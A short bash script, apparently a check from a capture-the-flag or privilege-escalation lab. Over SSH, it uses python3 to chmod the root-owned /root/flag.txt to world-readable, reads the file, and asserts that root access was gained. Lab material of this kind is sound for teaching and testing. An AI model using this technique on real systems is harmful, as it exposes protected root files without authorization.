#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
/usr/bin/python3 -c "import os; os.chmod(\"/root/flag.txt\", 0o644)"
cat /root/flag.txt
')"
assert_root_output "${out}"
